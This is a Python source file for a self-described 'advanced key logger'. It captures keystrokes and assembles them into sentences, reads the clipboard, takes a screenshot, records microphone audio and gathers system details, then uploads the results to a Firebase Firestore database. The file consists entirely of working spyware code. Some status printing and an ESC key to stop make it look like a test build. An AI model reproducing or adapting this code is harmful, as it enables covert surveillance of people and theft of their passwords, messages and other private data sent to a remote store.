import os
import socket
import platform
import time
import pyperclip
import firebase_admin
from firebase_admin import credentials, firestore
import pyaudio
import wave
import pyscreenshot as ImageGrab
from pynput.keyboard import Key, Listener
from datetime import datetime

# File and path configurations
log_directory = "/Users/haroonahmed28/Desktop/advanced_key_logs"
os.makedirs(log_directory, exist_ok=True)  # Create the directory for log files

# Log filenames
sys_info_file = "system.txt"
audio_log_file = "audio_recording.wav"
clipboard_log_file = "clipboard.txt"
screenshot_file = "screenshot.png"
keystroke_log_file = "key_log.txt"

# Time controls
log_interval = 15  # seconds, for testing
max_iterations = 2
start_time = time.time()
end_time = start_time + log_interval

# Firebase Configuration
cred = credentials.Certificate('/Users/haroonahmed28/Desktop/advanced_key_logs/service_account_key/advanced-key-logger-firebase-adminsdk-xgjia-b4f753e56c.json')  # Path to the Firebase service account key
firebase_admin.initialize_app(cred)
db = firestore.client()

# Track the last used collection number in a file
counter_file_path = os.path.join(log_directory, 'log_counter.txt')

# Function to get the next log collection number
def get_next_collection_number():
    try:
        if os.path.exists(counter_file_path):
            with open(counter_file_path, 'r') as file:
                last_number = int(file.read().strip())
            next_number = last_number + 1
        else:
            next_number = 1  # Starting point if the file doesn't exist
        with open(counter_file_path, 'w') as file:
            file.write(str(next_number))
        return next_number
    except Exception as e:
        print(f"Error reading or updating counter: {e}")
        return 1  # Default to log1 if an error occurs

# Function to store logs in Firestore with consistent document names
def store_log_in_firestore(log_name, log_data, log_collection):
    try:
        # Use the log_name as the document ID so it's consistent across collections
        log_ref = db.collection(log_collection).document(log_name)
        # Use update() to add new fields without overwriting the document
        log_ref.update(log_data)
        print(f"Log {log_name} successfully updated in Firestore under collection {log_collection}.")
    except Exception as e:
        # If the document does not exist yet, create it
        log_ref.set(log_data)
        print(f"Log {log_name} successfully stored in Firestore under collection {log_collection}.")

# Function to collect system information
def collect_system_info(log_collection):
    sys_info = {}
    try:
        sys_info['Processor'] = platform.processor()
        sys_info['System'] = platform.system() + " " + platform.version()
        sys_info['Machine'] = platform.machine()
        sys_info['Hostname'] = socket.gethostname()
        #sys_info['IP Address'] = socket.gethostbyname(socket.gethostname())      #Would retrieve the user's IP Address
        
        store_log_in_firestore(sys_info_file, sys_info, log_collection)
    except Exception as e:
        print(f"Error in collect_system_info: {e}")

# Function to log clipboard contents
def log_clipboard_contents(log_collection):
    try:
        data = pyperclip.paste()  # Using pyperclip to get clipboard contents
        clipboard_info = {'Clipboard Data': data}
        store_log_in_firestore(clipboard_log_file, clipboard_info, log_collection)
    except Exception as e:
        print(f"Error in log_clipboard_contents: {e}")

# Function to capture a screenshot
def capture_screenshot(log_collection):
    try:
        im = ImageGrab.grab()  # Capture the screenshot using pyscreenshot
        screenshot_path = os.path.join(log_directory, screenshot_file)
        im.save(screenshot_path)
        store_log_in_firestore(screenshot_file, {'Screenshot Path': screenshot_path}, log_collection)
    except Exception as e:
        print(f"Error in capture_screenshot: {e}")

# Function to record audio using pyaudio
def record_audio(log_collection):
    try:
        duration = 5  # Duration of the audio recording (in seconds)
        samplerate = 22050  # Reduced sample rate (22.05 kHz)
        channels = 1  # Mono audio
        frames_per_buffer = 256  # Smaller buffer to avoid overflow

        p = pyaudio.PyAudio()
        print("Recording Audio...")

        # Open audio stream with smaller frames_per_buffer
        stream = p.open(format=pyaudio.paInt16,
                        channels=channels,
                        rate=samplerate,
                        input=True,
                        frames_per_buffer=frames_per_buffer)  # Smaller buffer to avoid overflow

        frames = []
        for _ in range(0, int(samplerate / frames_per_buffer * duration)):
            try:
                data = stream.read(frames_per_buffer)
                frames.append(data)
            except IOError as e:
                print(f"Error reading audio stream: {e}")
                break

        # Stop and close the stream
        stream.stop_stream()
        stream.close()
        p.terminate()

        # Save the recorded audio to a .wav file
        audio_path = os.path.join(log_directory, audio_log_file)
        with wave.open(audio_path, 'wb') as wf:
            wf.setnchannels(channels)
            wf.setsampwidth(p.get_sample_size(pyaudio.paInt16))
            wf.setframerate(samplerate)
            wf.writeframes(b''.join(frames))

        # Store audio path in Firebase
        store_log_in_firestore(audio_log_file, {'Audio Path': audio_path}, log_collection)
        print("Audio recording finished.")
    except Exception as e:
        print(f"Error in record_audio: {e}")

# Function to record keystrokes and store complete sentences
def record_keystrokes(log_collection):
    keys = []
    sentence_counter = 1  # Start a counter for sentences
    
    def on_key_press(key):
        nonlocal keys, sentence_counter
        
        # Add the key to the current sentence
        try:
            if key == Key.enter:  # If Enter key is pressed, submit the sentence
                sentence = ''.join(keys).strip()  # Strip leading/trailing spaces
                if sentence:  # Only store non-empty sentences
                    keystroke_info = {f'Sentence_{sentence_counter}': sentence}  # New field for each sentence
                    store_log_in_firestore(keystroke_log_file, keystroke_info, log_collection)
                    print(f"Logged sentence: {sentence}")
                    sentence_counter += 1  # Increment the sentence counter
                keys.clear()  # Reset the sentence after saving it
            
            elif key == Key.space:
                keys.append(" ")  # Add space to sentence
                
            elif key == Key.backspace:
                if keys:
                    keys.pop()  # Remove last character if backspace is pressed

            else:
                # For other keys, append the character to the sentence
                keys.append(str(key).replace("'", ""))  # Remove quotes around key

        except Exception as e:
            print(f"Error in on_key_press: {e}")

    def on_key_release(key):
        if key == Key.esc:
            return False  # Stop the listener when ESC key is pressed

    with Listener(on_press=on_key_press, on_release=on_key_release) as listener:
        listener.join()

# Main logging function
def execute_logging():
    # Get the next available collection number (log1, log2, etc.)
    collection_number = get_next_collection_number()
    log_collection = f"log{collection_number}"  # e.g., log1, log2, log3, etc.

    print(f"Using collection {log_collection} for this run.")

    collect_system_info(log_collection)
    log_clipboard_contents(log_collection)
    capture_screenshot(log_collection)
    record_audio(log_collection)  # Call to record audio
    record_keystrokes(log_collection)

    print("Logging completed.")

# Run the main logging function
if __name__ == "__main__":
    execute_logging()
